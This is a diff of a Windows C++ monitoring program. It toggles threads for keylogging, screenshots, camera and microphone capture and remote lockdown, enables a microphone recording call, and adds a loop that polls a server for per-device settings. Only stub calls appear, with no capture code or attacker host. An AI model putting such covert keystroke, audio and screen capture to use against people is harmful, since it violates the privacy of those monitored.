@@ -8,9 +8,9 @@ DWORD WINAPI initFiltering(LPVOID lpParam)
 DWORD WINAPI initKeylogger(LPVOID lpParam)
 {
  //   keylogger();
-    while (1) {
-        Sleep(1);
-    }
+  //  while (1) {
+   //     Sleep(1);
+   // }
     return 0;
 }
 DWORD WINAPI initScreenshot(LPVOID lpParam)
@@ -27,12 +27,12 @@ DWORD WINAPI initTimeLockdown(LPVOID lpParam)
 }
 DWORD WINAPI initCamera(LPVOID lpParam)
 {
-    camera();
+  //  camera();
     return 0;
 }
 DWORD WINAPI initMic(LPVOID lpParam)
 {
-  //  recordWAVEFile((DWORD)5000);
+    recordWAVEFile((DWORD)5000);
     return 0;
 }
 DWORD WINAPI initRemoteLockdown(LPVOID lpParam)
@@ -68,4 +68,22 @@ DWORD WINAPI sendItem(LPVOID lpParam, LPSTR itemType)
 }
 
 
+DWORD WINAPI getItem(LPVOID lpParam, LPSTR itemType)
+{
+    LPSTR success = NULL;
+    LPCWSTR deviceID = L"1aa46bc6-4f58-4027-9980-c82badac16c9"; // TODO : Get real device ID
+    while (success == NULL) {
+   
+        LPCWSTR additionalHeaders = L"Accept:application/json\r\n\r\n";
+        
+        std::wstring mywstring(deviceID);
+        std::wstring concatted_stdstr = L"/data/get/" + mywstring + L"/settings";
+        LPCWSTR apiUrl = concatted_stdstr.c_str();
 
+        LPCWSTR method = L"GET";
+
+        success = SendRequest(additionalHeaders, NULL, apiUrl, method);
+        // Save response to disk
+    }
+    return 0;
+}
